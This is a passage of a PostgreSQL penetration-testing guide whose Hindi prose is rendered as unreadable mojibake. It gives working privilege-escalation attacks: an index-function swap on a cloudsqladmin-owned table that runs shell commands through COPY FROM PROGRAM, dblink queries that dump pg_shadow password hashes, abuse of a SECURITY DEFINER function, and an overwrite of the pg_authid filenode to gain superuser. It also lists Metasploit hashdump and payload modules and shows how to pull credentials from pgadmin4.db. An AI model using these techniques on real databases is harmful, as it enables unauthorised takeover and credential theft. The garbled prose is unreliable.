4. рддрд╛рд▓рд┐рдХрд╛ рдХреЗ рдорд╛рд▓рд┐рдХ рдХреЛ "cloudsqladmin" рдореЗрдВ рдмрджрд▓реЗрдВ, рдЬреЛ рдХреНрд▓рд╛рдЙрдб SQL рджреНрд╡рд╛рд░рд╛ рдбреЗрдЯрд╛рдмреЗрд╕ рдХрд╛ рдкреНрд░рдмрдВрдзрди рдФрд░ рд░рдЦ-рд░рдЦрд╛рд╡ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓реА GCP рдХреА рд╕реБрдкрд░рдпреВрдЬрд░ рднреВрдорд┐рдХрд╛ рд╣реИред
5. рддрд╛рд▓рд┐рдХрд╛ рдкрд░ рдПрдХ ANALYZE рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░реЗрдВред рдпрд╣ рдХрд╛рд░реНрд░рд╡рд╛рдИ PostgreSQL рдЗрдВрдЬрди рдХреЛ рддрд╛рд▓рд┐рдХрд╛ рдХреЗ рдорд╛рд▓рд┐рдХ, "cloudsqladmin" рдХреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рдВрджрд░реНрдн рдореЗрдВ рд╕реНрд╡рд┐рдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░рддреА рд╣реИред рдЗрд╕ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, рд╣рд╛рдирд┐рдХрд╛рд░рдХ рдЕрдиреБрдХреНрд░рдорд┐рдХрд╛ рдХрд╛рд░реНрдп рдХреЛ "cloudsqladmin" рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдкрд╣рд▓реЗ рдЕрдирдзрд┐рдХреГрдд рд╢реИрд▓ рдХрдорд╛рдВрдб рдХрд╛ рдирд┐рд╖реНрдкрд╛рджрди рд╕рдВрднрд╡ рд╣реЛрддрд╛ рд╣реИред

PostgreSQL рдореЗрдВ, рдпрд╣ рдлреНрд▓реЛ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рджрд┐рдЦрддрд╛ рд╣реИ:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
рддреЛ, `shell_commands_results` рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХреЛрдб рдХрд╛ рдЖрдЙрдЯрдкреБрдЯ рд╣реЛрдЧрд╛:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### рд╕реНрдерд╛рдиреАрдп рд▓реЙрдЧрд┐рди

рдХреБрдЫ рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП postgresql рдЗрдВрд╕реНрдЯреЗрдВрд╕реЗрдЬ рдХрд┐рд╕реА рднреА рд╕реНрдерд╛рдиреАрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ, 127.0.0.1 рд╕реЗ **`dblink` рдлрд╝рдВрдХреНрд╢рди** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реНрдерд╛рдиреАрдп рд▓реЙрдЧрд┐рди рд╕рдВрднрд╡ рд╣реИ:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
{% hint style="warning" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдкрд┐рдЫрд▓реЗ рдХреНрд╡реЗрд░реА рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдлрд╝рдВрдХреНрд╢рди `dblink` рдореМрдЬреВрдж рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП**ред рдЕрдЧрд░ рдпрд╣ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ, рддреЛ рдЖрдк рдЗрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЗ рд╕рд╛рде рдмрдирд╛рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```sql
CREATE EXTENSION dblink;
```
{% endhint %}

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЕрдзрд┐рдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб рд╣реИ, рд▓реЗрдХрд┐рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдмрд╛рд╣рд░реА рдЖрдИрдкреА рд╕реЗ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИ, рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдХреНрд╡реЗрд░реА рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
рдЗрд╕рдХреА рдЬрд╛рдВрдЪ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **рд╕реБрд░рдХреНрд╖рд╛ рдкрд░рд┐рднрд╛рд╖рдХ рдХреЗ рд╕рд╛рде рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд╕реНрдЯрдо рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд╛рд░реНрдп**

[**рдЗрд╕ рд▓реЗрдЦ рдореЗрдВ**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), рдкреЗрдВрдЯреЗрд╕реНрдЯрд░реНрд╕ рдХреЛ IBM рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП postgres рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдореЗрдВ privesc рдХрд░рдиреЗ рдореЗрдВ рд╕рдлрд▓рддрд╛ рдорд┐рд▓реА, рдХреНрдпреЛрдВрдХрд┐ рдЙрдиреНрд╣реЛрдВрдиреЗ **рдЗрд╕ рдХрд╛рд░реНрдп рдХреЛ рд╕реБрд░рдХреНрд╖рд╛ рдкрд░рд┐рднрд╛рд╖рдХ рдзреНрд╡рдЬ рдХреЗ рд╕рд╛рде рдкрд╛рдпрд╛**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
тАж
</code></pre>

[**рджрд╕реНрддрд╛рд╡реЗрдЬреЛрдВ рдореЗрдВ рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг рдХреЗ рдЕрдиреБрд╕рд╛рд░**](https://www.postgresql.org/docs/current/sql-createfunction.html) рд╕реБрд░рдХреНрд╖рд╛ рдкрд░рд┐рднрд╛рд╖рдХ рдХреЗ рд╕рд╛рде рдПрдХ рдХрд╛рд░реНрдп **рдЙрд╕ рдЙрдкрдпреЛрдХреНрддрд╛ рдХреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдорд╛рд▓рд┐рдХ рд╣реИ**ред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдХрд╛рд░реНрдп **SQL Injection рдХреЗ рд▓рд┐рдП рд╡рдВрд╢рд╛рд╡рдзрд┐ рд╣реИ** рдпрд╛ рдпрд╣ рдХрд┐рд╕реА **рд╣рдорд▓рд╛рд╡рд░реНрддреА рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реА рдХреНрд░рд┐рдпрд╛рдПрдВ рдХрд░ рд░рд╣рд╛ рд╣реИ**, рддреЛ рдпрд╣ postgres рдХреЗ рднреАрддрд░ **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЙрдиреНрдирдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред

рдкрд┐рдЫрд▓реЗ рдХреЛрдб рдХреА рдкрдВрдХреНрддрд┐ 4 рдореЗрдВ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХрд╛рд░реНрдп рдореЗрдВ **рд╕реБрд░рдХреНрд╖рд╛ рдкрд░рд┐рднрд╛рд╖рдХ** рдзреНрд╡рдЬ рд╣реИред
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
рдФрд░ рдлрд┐рд░ **рдХрдорд╛рдВрдб рдЪрд▓рд╛рдПрдВ**:

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

### PL/pgSQL рдХреЗ рд╕рд╛рде рдкрд╛рд╕ рдмреБрд░реНрдЯрдлреЛрд░реНрд╕

**PL/pgSQL** рдПрдХ **рдкреВрд░реА рд╡рд┐рд╢реЗрд╖рддрд╛ рд╡рд╛рд▓реА рдкреНрд░реЛрдЧреНрд░рд╛рдорд┐рдВрдЧ рднрд╛рд╖рд╛** рд╣реИ рдЬреЛ SQL рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рдЕрдзрд┐рдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛рддреНрдордХ рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИред рдпрд╣ **рд▓реВрдк** рдФрд░ рдЕрдиреНрдп **рдирд┐рдпрдВрддреНрд░рдг рд╕рдВрд░рдЪрдирд╛рдПрдВ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рд╕реБрд╡рд┐рдзрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдХрд╛рд░реНрдпрдХреНрд░рдо рддрд░реНрдХ рдХреЛ рдмрдврд╝рд╛рд╡рд╛ рдорд┐рд▓ рд╕рдХреЗред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, **SQL рд╡рдХреНрддрд╡реНрдп** рдФрд░ **рдЯреНрд░рд┐рдЧрд░** рдХреЛ **PL/pgSQL рднрд╛рд╖рд╛** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрдирд╛рдП рдЧрдП рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдЖрдордВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрддреА рд╣реИред рдпрд╣ рдПрдХ рдФрд░ рд╡реНрдпрд╛рдкрдХ рдФрд░ рдмрд╣реБрдореБрдЦреА рдкрд╣реБрдВрдЪ рдХреА рджреГрд╖реНрдЯрд┐ рд╕реЗ рдбреЗрдЯрд╛рдмреЗрд╕ рдкреНрд░реЛрдЧреНрд░рд╛рдорд┐рдВрдЧ рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рди рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрдзрд┐рдХ рд╕рдордЧреНрд░ рдФрд░ рд╡рд┐рд╡рд┐рдз рджреГрд╖реНрдЯрд┐рдХреЛрдг рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред\
**рдЖрдк рдЗрд╕ рднрд╛рд╖рд╛ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ PostgreSQL рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

### рдЖрдВрддрд░рд┐рдХ PostgreSQL рддрд╛рд▓рд┐рдХрд╛рдУрдВ рдХреЛ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░рдХреЗ Privesc

{% hint style="info" %}
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд Privesc рд╡реЗрдХреНрдЯрд░ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рд╕реАрдорд┐рдд SQLi рд╕рдВрджрд░реНрднреЛрдВ рдореЗрдВ рдЙрдкрдпреЛрдЧреА рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рд╕рднреА рдХрджрдо рдиреЗрд╕реНрдЯреЗрдб SELECT рд╡рдХреНрддрд╡реНрдпреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред
{% endhint %}

рдпрджрд┐ рдЖрдк **PostgreSQL рд╕рд░реНрд╡рд░ рдлрд╝рд╛рдЗрд▓реЗрдВ рдкрдврд╝ рдФрд░ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ**, рддреЛ рдЖрдк **рдкреЛрд╕реНрдЯрдЧреНрд░реЗрд╕ рдХреЗ рдСрди-рдбрд┐рд╕реНрдХ рдлрд╛рдЗрд▓рдиреЛрдб рдХреЛ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░рдХреЗ рд╕реБрдкрд░рдпреВрдЬрд░ рдмрди рд╕рдХрддреЗ рд╣реИрдВ**, рдЬреЛ рдЖрдВрддрд░рд┐рдХ `pg_authid` рддрд╛рд▓рд┐рдХрд╛ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╣реИред

**рдЗрд╕ рддрдХрдиреАрдХ** рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдиреЗрдВ [**рдпрд╣рд╛рдБ**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**ред**

рд╣рдорд▓реЗ рдХреЗ рдХрджрдо рд╣реИрдВ:

1. PostgreSQL рдбреЗрдЯрд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
2. `pg_authid` рддрд╛рд▓рд┐рдХрд╛ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдлрд╛рдЗрд▓рдиреЛрдб рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рд╛рдкреЗрдХреНрд╖ рдорд╛рд░реНрдЧ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
3. `lo_*` рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдлрд╛рдЗрд▓рдиреЛрдб рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ
4. `pg_authid` рддрд╛рд▓рд┐рдХрд╛ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдбреЗрдЯрд╛рдЯрд╛рдЗрдк рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
5. [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдлрд╛рдЗрд▓рдиреЛрдб рдХреЛ [рд╕рдВрдкрд╛рджрд┐рдд рдХрд░рдиреЗ](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg\_authid-table) рдХреЗ рд▓рд┐рдП; рд╕рднреА `rol*` рдмреВрд▓рд┐рдпрди рдЭрдВрдбреЗ рдХреЛ 1 рдХреЗ рд▓рд┐рдП рд╕рдВрдкреВрд░реНрдг рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рд╕реЗрдЯ рдХрд░реЗрдВред
6. `lo_*` рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдВрдкрд╛рджрд┐рдд рдлрд╛рдЗрд▓рдиреЛрдб рдХреЛ рдкреБрдирдГ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ, рдФрд░ рдбрд┐рд╕реНрдХ рдкрд░ рдореВрд▓ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░реЗрдВ
7. _(рд╡реИрдХрд▓реНрдкрд┐рдХ рд░реВрдк рд╕реЗ)_ рдПрдХ рдорд╣рдВрдЧреЗ SQL рдХреНрд╡реЗрд░реА рдЪрд▓рд╛рдХрд░ рдЗрди-рдореЗрдореЛрд░реА рддрд╛рд▓рд┐рдХрд╛ рдХреИрд╢ рдХреЛ рд╕рд╛рдлрд╝ рдХрд░реЗрдВ
8. рдЕрдм рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ рдкреВрд░реНрдг рд╕реБрдкрд░рдПрдбрдорд┐рди рдХреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╣реЛрдиреЗ рдЪрд╛рд╣рд┐рдПред

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### рд▓реЙрдЧрд┐рдВрдЧ

_**postgresql.conf**_ рдлрд╝рд╛рдЗрд▓ рдХреЗ рдЕрдВрджрд░ рдЖрдк postgresql рд▓реЙрдЧ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ рдмрджрд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
рдлрд┐рд░, **рд╕реЗрд╡рд╛ рдкреБрдирдГ рдЖрд░рдВрдн** рдХрд░реЗрдВред

### pgadmin

[pgadmin](https://www.pgadmin.org) PostgreSQL рдХреЗ рд▓рд┐рдП рдПрдХ рдкреНрд░рд╢рд╛рд╕рди рдФрд░ рд╡рд┐рдХрд╛рд╕ рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рд╣реИред\
рдЖрдк _**pgadmin4.db**_ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ **рдкрд╛рд╕рд╡рд░реНрдб** рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВред\
рдЖрдк рдЗрдиреНрд╣реЗрдВ рдЗрд╕ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рднреАрддрд░ _**decrypt**_ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg\_hba

рдкреЛрд╕реНрдЯрдЧреНрд░реЗрд╕рдХреНрдпреВрдПрд▓ рдореЗрдВ рдХреНрд▓рд╛рдЗрдВрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг **pg\_hba.conf** рдирд╛рдордХ рдПрдХ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рдмрдВрдзрд┐рдд рд╣реЛрддрд╛ рд╣реИред рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдПрдХ рд╢реНрд░реГрдВрдЦрд▓рд╛ рд░рд┐рдХреЙрд░реНрдб рд╣реЛрддреЗ рд╣реИрдВ, рдкреНрд░рддреНрдпреЗрдХ рд░рд┐рдХреЙрд░реНрдб рдореЗрдВ рдПрдХ рдХрдиреЗрдХреНрд╢рди рдкреНрд░рдХрд╛рд░, рдХреНрд▓рд╛рдЗрдВрдЯ рдЖрдИрдкреА рдкрддрд╛ рд░реЗрдВрдЬ (рдпрджрд┐ рд▓рд╛рдЧреВ рд╣реЛ), рдбреЗрдЯрд╛рдмреЗрд╕ рдирд╛рдо, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо, рдФрд░ рдореЗрд▓ рдорд┐рд▓рд╛рдиреЗ рд╡рд╛рд▓реЗ рдХрдиреЗрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╡рд┐рдзрд┐ рд╢рд╛рдорд┐рд▓ рд╣реЛрддреА рд╣реИред рдХрдиреЗрдХреНрд╢рди рдкреНрд░рдХрд╛рд░, рдХреНрд▓рд╛рдЗрдВрдЯ рдкрддрд╛, рдЕрдиреБрд░реЛрдзрд┐рдд рдбреЗрдЯрд╛рдмреЗрд╕, рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдХреЛ рдорд┐рд▓рд╛рдиреЗ рд╡рд╛рд▓рд╛ рдкрд╣рд▓рд╛ рд░рд┐рдХреЙрд░реНрдб рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрджрд┐ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╡рд┐рдлрд▓ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдХреЛрдИ рдкреНрд░рддрд┐рд╕рд╛рдзрди рдпрд╛ рдмреИрдХрдЕрдк рдирд╣реАрдВ рд╣реИред рдпрджрд┐ рдХреЛрдИ рд░рд┐рдХреЙрд░реНрдб рдореЗрд▓ рдирд╣реАрдВ рдЦрд╛рддрд╛ рд╣реИ, рддреЛ рдкрд╣реБрдВрдЪ рдирд┐рд╖реЗрдзрд┐рдд рдХреА рдЬрд╛рддреА рд╣реИред

pg\_hba.conf рдореЗрдВ рдЙрдкрд▓рдмреНрдз рдкрд╛рд╕рд╡рд░реНрдб-рдЖрдзрд╛рд░рд┐рдд рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╡рд┐рдз
